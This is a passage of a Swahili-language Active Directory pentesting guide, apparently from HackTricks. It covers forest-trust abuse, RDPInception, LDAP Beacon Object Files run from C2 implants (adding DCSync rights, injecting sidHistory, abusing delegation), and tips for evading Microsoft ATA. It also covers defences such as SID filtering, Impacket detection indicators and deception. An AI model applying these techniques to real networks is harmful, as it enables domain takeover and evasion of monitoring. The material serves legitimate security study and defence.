Maelezo zaidi yanapatikana kwenye [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Katika hali ambapo ADCS haipo, mshambuliaji anaweza kusanidi vipengele vinavyohitajika, kama ilivyoelezwa kwenye [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Domain ya Forest ya Nje - One-Way (Inbound) au bidirectional

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Katika hali hii, **domain yako inaaminiwa** na domain ya nje, hivyo unapata **ruhusa zisizobainishwa** juu yake. Utahitaji kubaini **ni principals gani za domain yako zina ufikiaji gani kwenye domain ya nje**, kisha ujaribu kuitumia vibaya:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domain ya Forest ya Nje - Njia Moja (Outbound)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Katika hali hii, **domain yako** ndiyo **inayoamini** baadhi ya **privileges** za principal kutoka **domain tofauti**.

Hata hivyo, domain inapoaminiwa na domain inayoamini, domain inayoaminiwa **huunda user** mwenye **jina linalotabirika** na kutumia **password ya trust** kama **password** yake. Hii ina maana kwamba inawezekana **kuingia kwenye user wa domain inayoamini ili kuingia kwenye domain inayoaminiwa**, kuichunguza na kujaribu kuongeza privileges zaidi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Njia nyingine ya kuhatarisha domain inayoaminiwa ni kupata [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) iliyoundwa katika **mwelekeo ulio kinyume** na trust ya domain (jambo ambalo si la kawaida sana).

Njia nyingine ya kuhatarisha domain inayoaminiwa ni kusubiri kwenye mashine ambayo **user kutoka domain inayoaminiwa anaweza kuifikia** ili kuingia kupitia **RDP**. Kisha, mshambuliaji anaweza kuingiza code kwenye process ya session ya RDP na **kufikia domain asili ya victim** kutoka hapo.\
Zaidi ya hayo, ikiwa **victim ali-mount hard drive yake**, mshambuliaji anaweza kuhifadhi **backdoors** kwenye **startup folder ya hard drive** kupitia process ya **RDP session**. Mbinu hii inaitwa **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Kupunguza matumizi mabaya ya trust za domain

### **SID Filtering:**

- Hatari ya mashambulizi yanayotumia sifa ya SID history kupitia forest trusts hupunguzwa kwa SID Filtering, ambayo huwashwa kwa chaguomsingi kwenye trust zote kati ya forest. Hili linategemea dhana kwamba trust za ndani ya forest ni salama, na kwamba forest, badala ya domain, ndiyo mpaka wa usalama kulingana na msimamo wa Microsoft.
- Hata hivyo, kuna changamoto: SID filtering inaweza kuvuruga applications na ufikiaji wa watumiaji, hivyo wakati mwingine huzimwa.

### **Selective Authentication:**

- Kwa trust kati ya forest, kutumia Selective Authentication huhakikisha kwamba watumiaji kutoka forest hizo mbili hawa-authenticate-ki kiotomatiki. Badala yake, watumiaji wanahitaji ruhusa maalum ili kufikia domain na servers ndani ya domain au forest inayoamini.
- Ni muhimu kutambua kwamba hatua hizi hazilindi dhidi ya matumizi mabaya ya writable Configuration Naming Context (NC) au mashambulizi dhidi ya trust account.

[**Maelezo zaidi kuhusu domain trusts katika ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Matumizi mabaya ya AD yanayotegemea LDAP kutoka kwa implants kwenye host

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) hutekeleza upya primitives za LDAP za mtindo wa bloodyAD kama x64 Beacon Object Files zinazoendeshwa kikamilifu ndani ya implant kwenye host (kwa mfano, Adaptix C2). Operators hukompile pack kwa `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, hupakia `ldap.axs`, kisha huita `ldap <subcommand>` kutoka kwenye beacon. Trafiki yote hutumia muktadha wa usalama wa logon ya sasa kupitia LDAP (389) pamoja na signing/sealing au LDAPS (636) yenye uaminifu wa cheti wa kiotomatiki, kwa hiyo hakuna haja ya socks proxies au disk artifacts.<sup>[[4]](#references)</sup>

### Uhesabuji wa LDAP upande wa implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, na `get-groupmembers` hutatua majina mafupi/njia za OU kuwa DNs kamili na kutoa dump ya objects zinazolingana.
- `get-object`, `get-attribute`, na `get-domaininfo` hupata attributes zozote (ikiwemo security descriptors) pamoja na metadata ya forest/domain kutoka `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, na `get-rbcd` huonyesha wagombea wa roasting, mipangilio ya delegation, na descriptors zilizopo za [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) moja kwa moja kutoka LDAP.
- `get-acl` na `get-writable --detailed` huchanganua DACL ili kuorodhesha trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), na inheritance, na hivyo kutoa mara moja malengo ya privilege escalation kupitia ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Uwezo wa LDAP wa kuandika kwa ajili ya kuongeza marupurupu na kudumisha ufikiaji

- BOF za kuunda objects (`add-user`, `add-computer`, `add-group`, `add-ou`) humwezesha operator kuweka principals au akaunti mpya za mashine mahali popote ambapo kuna ruhusa za OU. `add-groupmember`, `set-password`, `add-attribute`, na `set-attribute` huteka udhibiti wa targets moja kwa moja mara tu ruhusa za write-property zinapopatikana.
- Amri zinazolenga ACL kama `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, na `add-dcsync` hubadilisha WriteDACL/WriteOwner kwenye object yoyote ya AD kuwa uwezo wa kuweka upya nywila, kudhibiti uanachama wa vikundi, au kupata marupurupu ya urudufishaji wa DCSync bila kuacha alama za PowerShell/ADSI. Amri zinazolingana za `remove-*` husafisha ACE zilizodungwa.

### Delegation, roasting, na matumizi mabaya ya Kerberos

- `add-spn`/`set-spn` humfanya mara moja mtumiaji aliyeathiriwa aweze kulengwa kwa Kerberoast; `add-asreproastable` (kubadilisha UAC) humweka alama kwa ajili ya AS-REP roasting bila kugusa nywila.
- Macros za delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) hubadilisha `msDS-AllowedToDelegateTo`, alama za UAC, au `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka kwenye beacon, na kuwezesha njia za mashambulizi za constrained/unconstrained/RBCD bila kuhitaji PowerShell ya mbali au RSAT.

### Kudunga sidHistory, kuhamisha OU, na kurekebisha uso wa mashambulizi

- `add-sidhistory` hudunga SID zenye marupurupu kwenye historia ya SID ya principal inayodhibitiwa (tazama [SID-History Injection](sid-history-injection.md)), na kutoa urithi wa ufikiaji wa siri kupitia LDAP/LDAPS pekee.
- `move-object` hubadilisha DN/OU ya kompyuta au watumiaji, na kumwezesha mshambuliaji kuhamisha assets hadi kwenye OU zilizo na ruhusa zilizokabidhiwa kabla ya kutumia vibaya `set-password`, `add-groupmember`, au `add-spn`.
- Amri za kuondoa zenye wigo finyu (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, n.k.) huruhusu kurudisha mabadiliko haraka baada ya operator kuvuna credentials au kuweka persistence, na hivyo kupunguza telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Baadhi ya Mbinu za Jumla za Ulinzi

[**Jifunze zaidi kuhusu jinsi ya kulinda credentials hapa.**](../stealing-credentials/credentials-protections.md)

### **Hatua za Kinga ya Credentials**

- **Vikwazo kwa Domain Admins**: Inapendekezwa kuwa Domain Admins waruhusiwe kuingia kwenye Domain Controllers pekee, na wasitumike kwenye hosts nyingine.
- **Marupurupu ya Akaunti za Huduma**: Huduma hazipaswi kuendeshwa kwa marupurupu ya Domain Admin (DA) ili kudumisha usalama.
- **Kuweka Kikomo cha Muda kwa Marupurupu**: Kwa kazi zinazohitaji marupurupu ya DA, muda wake unapaswa kuwa mfupi. Hili linaweza kufanywa kwa: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Kupunguza hatari ya LDAP relay**: Kagua Event IDs 2889/3074/3075, kisha wezesha LDAP signing pamoja na LDAPS channel binding kwenye DCs/clients ili kuzuia majaribio ya LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Utambuzi wa shughuli za Impacket kupitia alama za kiwango cha protocol

Ukitaka kutambua mbinu za kawaida za AD, **usitegemee tu alama zinazodhibitiwa na operator** kama binaries zilizobadilishwa majina, majina ya huduma, batch files za muda, au njia za matokeo. Weka baseline ya jinsi clients halali za Windows zinavyounda trafiki ya [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, na WMI, kisha tafuta **mambo yasiyo ya kawaida ya utekelezaji** yanayobaki hata baada ya operator kuhariri `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, au `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Viashiria huru vinavyoaminika kwa kiwango cha juu** (baada ya kuvihakiki dhidi ya baseline yenu):
  - DCE/RPC iliyothibitishwa inayotumia `auth_context_id = 79231 + ctx_id`
  - Padding ya uthibitishaji wa DCE/RPC iliyojaa `0xff`
  - LDAP Kerberos binds zinazoweka Kerberos `AP-REQ` ghafi moja kwa moja kwenye SPNEGO `mechToken`
  - Maombi ya SMB2/3 negotiate yenye thamani za `ClientGuid` zinazoonekana kama ASCII
  - WMI `IWbemLevel1Login::NTLMLogin` inayotumia namespace isiyo ya kawaida `//./root/cimv2`
  - Thamani za Kerberos nonce zilizowekwa moja kwa moja kwenye msimbo
- **Yatumie vyema kama vipengele vya kuoanisha/kukadiria alama**:
  - Orodha za Kerberos etype zenye aina chache au zilizorudiwa, `PA-DATA` isiyo ya kawaida/inayokosekana, au mpangilio wa etype wa TGS-REQ unaotofautiana na Windows asilia
  - Ujumbe wa NTLM Type 1 usio na taarifa za version au ujumbe wa Type 3 wenye majina ya host yaliyo null
  - NTLMSSP ghafi inayobebwa ndani ya DCE/RPC badala ya SPNEGO, kukosekana kwa DCE/RPC verification trailers, au kutolingana kwa SPNEGO/Kerberos OID
  - Sifa kadhaa kati ya hizi kutoka kwa host/user/session/muda mmoja zina nguvu zaidi ya field moja dhaifu
- **Vitumie kwa kuongeza muktadha, si kama tahadhari huru**:
  - Majina ya faili ya chaguo-msingi, njia za matokeo, majina ya huduma nasibu, majina ya batch ya muda, majina ya akaunti za kompyuta ya chaguo-msingi, na strings za HTTP/WebDAV/RDP/MSSQL zinazohusishwa na tool maalum
  - Operator anaweza kubadilisha hivi kwa urahisi; vinafaa zaidi kueleza kwa nini kundi la viashiria vya protocols tofauti linatia shaka
- **Maelezo ya kiutendaji**:
  - Baadhi ya viashiria hivi vinahitaji trafiki iliyosimbuliwa, [uchanganuzi wa PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, au mwonekano wa upande wa huduma
  - Vihakiki dhidi ya clients za Samba/Linux, vifaa maalum, na software za zamani kabla ya kuvigeuza kuwa tahadhari
  - Hamishia detections kutoka enrichment -> hunting -> alerting kadri unavyojenga imani kwenye baseline

### **Utekelezaji wa Mbinu za Udanganyifu**

- Utekelezaji wa udanganyifu unahusisha kuweka mitego, kama watumiaji au kompyuta za chambo, zenye sifa kama nywila zisizoisha muda wake au alama ya Trusted for Delegation. Mbinu ya kina inajumuisha kuunda watumiaji wenye haki maalum au kuwaongeza kwenye vikundi vyenye marupurupu ya juu.<sup>[[2]](#references)</sup>
- Mfano wa vitendo ni kutumia tools kama: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Maelezo zaidi kuhusu kutumia mbinu za udanganyifu yanapatikana kwenye [Deploy-Deception kwenye GitHub](https://github.com/samratashok/Deploy-Deception).

### **Kutambua Udanganyifu**

- **Kwa User Objects**: Viashiria vya kutiliwa shaka ni pamoja na ObjectSID isiyo ya kawaida, logons zisizotokea mara kwa mara, tarehe za kuundwa, na idadi ndogo ya nywila zisizo sahihi.
- **Viashiria vya Jumla**: Kulinganisha attributes za objects zinazoweza kuwa za chambo na zile za objects halisi kunaweza kufichua kutolingana. Tools kama [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) zinaweza kusaidia kutambua udanganyifu huo.

### **Kukwepa Mifumo ya Utambuzi**

- **Kukwepa Utambuzi wa Microsoft ATA**:
  - **Kuhesabu Watumiaji**: Epuka kuhesabu sessions kwenye Domain Controllers ili kuzuia kutambuliwa na ATA.
  - **Kuiga Utambulisho wa Ticket**: Kutumia funguo za **aes** kuunda ticket husaidia kukwepa utambuzi kwa kutoshusha kiwango hadi NTLM.
  - **Mashambulizi ya DCSync**: Inashauriwa kutekeleza kutoka kwa mashine isiyo Domain Controller ili kuepuka kutambuliwa na ATA, kwa kuwa kutekeleza moja kwa moja kutoka kwa Domain Controller kutasababisha tahadhari.

## References

- [1] [Mwongozo wa Kushambulia Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Kutengeneza Trusts kwa Udanganyifu katika Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Kutoka Domain Admin hadi Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Mkusanyiko wa LDAP BOF – LDAP Toolkit ya Active Directory Exploitation inayotumia Kumbukumbu](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Kutumia NTLM Hashes kama Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Kuchambua Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Kuteka Akaunti za Active Directory kupitia Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Jinsi ya kusimamia mabadiliko katika miunganisho salama ya channel ya Netlogon yanayohusiana na CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Safari katika interfaces za Null Session na MS-RPC zilizosahaulika](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter kama mpaka wa usalama kati ya domains? (Sehemu ya 4) - Utafiti wa kukwepa SID filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter kama mpaka wa usalama kati ya domains? (Sehemu ya 5) - Shambulizi la Golden GMSA trust - kutoka child hadi parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter kama mpaka wa usalama kati ya domains? (Sehemu ya 6) - Shambulizi la trust kupitia mabadiliko ya Schema - kutoka child hadi parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Kutoka DA hadi EA kwa kutumia ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Kupandisha marupurupu kutoka admins wa child domain hadi enterprise admins ndani ya dakika 5 kwa kutumia vibaya AD CS, ufuatiliaji](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE Iliyofichwa: Kubuni Milango ya Nyuma ya Active Directory DACL](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Chanzo cha NetExec pre2k module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - attribute ya msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
